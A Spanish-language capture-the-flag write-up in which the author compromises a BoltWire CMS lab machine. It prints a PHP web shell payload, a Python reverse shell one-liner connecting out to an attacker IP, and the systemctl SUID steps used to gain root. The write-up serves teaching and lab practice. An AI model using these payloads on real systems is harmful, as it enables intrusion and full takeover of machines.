### ConvidCTF 2020 - asdasd - Máquinas Writeup

Buenas a todos, hoy les traigo un writeup de uno los retos de la categoría de la categoría "Máquinas",
el nombre del reto era **asdasd**, este reto tenía dos flags, la primera de estas (user.txt) de 500 puntos
y la segunda (root.txt) 300 puntos.

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/1.png)

Para comenzar este reto me dirigí directamente al puerto 80 de esta máquina utilizando mi navegador, 
allí me esperaba la página incial del CMS **BoltWire**

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/2.png)

Lo que primero llamó mi atención fue la palabra **ADMIN** en el menú horizontal de la página, por lo cual decidí
tratar de acceder allí, al hacerlo me encontré con el siguiente mensaje

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/3.png)

Tras ese intento fallido de enumerar de manera rápida las funcionalidades del sitio web, decidí crear una cuenta en éste,
asi que hice click en el submenu **register** e ingrese mis futuras credenciales de acceso.

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/4.png)

Luego de registrarme exitosamente en el sitio, noté que éste me había logueado 
automáticamente por lo que contaba con una sesión activa

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/5.png)

Asi que nuevamente quize ingresar al panel de **ADMIN** y pum!, **Access Blocked**.. raios :c

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/6.png)

Para expandir mi *Attack Surface* fui a la páguina oficial del CMS **BoltWire** y me descargué su versión clásica

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/7.png)

Anteriormente me habia fijado en el parametro **p** el cual cambiaba según la página en que estaba navegando

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/8.png)

Cuando la descarga del CMS finalizó, encontré dentro de una de las carpetas que existia un archivo llamdo register,
tal cual como el nombre del parametro **p** mencionado anteriormente

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/9.png)

Y más arriba existía uno que me llamo la atención **action.create**, quizas podría subir archivos,
quizas podria crear un usuario con permisos de adminstracion, **quizas podria crear archivos**...

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/10.png)

Al cambiar el valor del parametro **p** por **action.create**, se me desplezo un formulario
que indicaba que podia crear una página. Dado esto decidí crear una de prueba y de regalo un trozito de código PHP
que me permitiría posiblemente ejecutar comandos de sistema bajo el contexto de la página

```
Hola<?php passthru($_GET["cmd"]); ?>
```

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/12.png)

Luego de guardar esta nueva página fui redirigido a esta misma pero para mi mala suerte,
el contenido no fue interpretado por el motor de PHP

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/13.png)

Por la ct.... no se ejecutó el pinche código asi que me puse a enumerar los directorios con 
[ffuf](https://github.com/ffuf/ffuf/) y encontré **pages**

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/14.png)

Me fui de cabeza a ese directorio y encontré la página que recién había creado, además de otras que me llamaron la atención.. pero no tanto

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/15.png)

Nuevamente fui a mi página recien creada y puuum!, nada, otra vez no fue interpretado mi código, 
peroooo .... y si le agrego la extension **.php**

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/16.png)

Eso!.. me fui a crear otra página, pero esta vez el nombre de la página sería **test.php**

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/17.png)

Otra vez luego de guardarla, nada, el código no era interpretado

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/18.png)

perooooooooooooooo acá en la carpeta **pages**, estaba mi hermosa página...

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/19.png)

Tras hacerle click, nada no se renderizaba nada, asi que probablemente mi código PHP se estaba interpretando..

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/20.png)

le agregué el parámetro **0**, de valor le di un simple comando para listar directorios en Linux

```ls -la```

Y siiiiiiiiiiiiii, ajajajajajjaj... se ejecutó el pinche comando...

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/21.png)

En mi terminal levante un listener con netcat

```nc -lvnp 3000```

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/23.png)

Me fui a mirar si había alguna versión de python instalado en la máquina

```which python3```

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/24.png)

Le di con el siguiente comando para obtener una reverse shell

```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Y pude lograr la deseada reverse shell

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/25.png)


![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/26.png)

Antes de ir por la flag de usuario quize enumerar más la maquina para poder tener mas claro,
como podría escalar privilegios y lograr ser root, me fui a la vieja y confiable.. el cheatsheet de g0tm1lk.
Tras varios copy paste llegue a la parte de los SUID

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/27.png)

Tras ejecutar el comando noté que **systemctl**, estaba con el bit de SUID, que tsutsa..

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/28.png)

Ahora en GTFOBins busqué el pinche binario y para suerte mia existia un método de escalación utilizando systemctl + SUID

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/29.png)

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/30.png)

Ya tenia mi vector para escalar privilegios, asi que me fui a sacar la flag del user

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/31.png)

Luego hice paso a paso, modificando un poco lo que decia en GTFOBins, cree un archivo test.service
le puse la estrucura básica de un servicio de windows...

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/32.png)

Levante nuevamente un listener en mi máquina...

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/33.png)

Hice una copia del systemctl, nose porqué, pero en GTFOBins decia que había que hacerlo... XD
Y cuando quize obtener mi reverse shell.... **Failed to link unit: Interactive authentication required**

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/34.png)

:c Que w3a... maldito www-data.. Pero filo, había un archivo que no había mirado en el home del usuario ubuntu, **secret.txt**

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/35.png)

Cuando lo miré dije, *Meh, un llave pública*...

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/36.png)

Fue en ese momento que aparecieron los cauros @h4tt0r1 y @fjv al rescate, recordaron un repósitorio de llaves privadas..
Yaaaa yyyyyyy... napo habian hartas..

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/37.png)

Pero cuando grepearon la llave pública que estaba en **secret.txt**.. ahi estaba la pinche llave privada...

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/38.png)

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/39.png)

```ssh ubuntu@10.4.4.66 -i llavectm```

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/40.png)

Luego de entrar como el usuario ubuntu, ya tenia enumerado como escalar, 
asi que nuevamente intente los pasos para crear el servicio..

```/bin/systemctl link /tmp/test.service
/bin/systemctl enable /tmp/test.service
/bin/systemctl start test.service
```
![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/41.png)

Me fui corriendo a revisar mi listener y siiiiiiiiiiiii HAAHHAHAHAHAA una shell con el usuario ROOOOOOT

![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/42.png)

Y eso.. fui a /root, saque la flag y 300 puntitos mas pa l@s cabr@s..

![test](https://raw.githubusercontent.com/pelaohxc/writeups/master/asdasd/46.png)


Ese fui mi humilde writeup, espero puedan rescatar algo c:

Gracias los cabros que apañaron en el reto [@h4tt0r1](https://www.cntr0llz.com/users/h4tt0r1) y [@fjv](https://www.cntr0llz.com/users/fjv)

Y un saludo a mi awelita que no la veo hace rato por el pinche virus.. :c

[@xpl0ited1](https://www.cntr0llz.com/users/xpl0ited1)
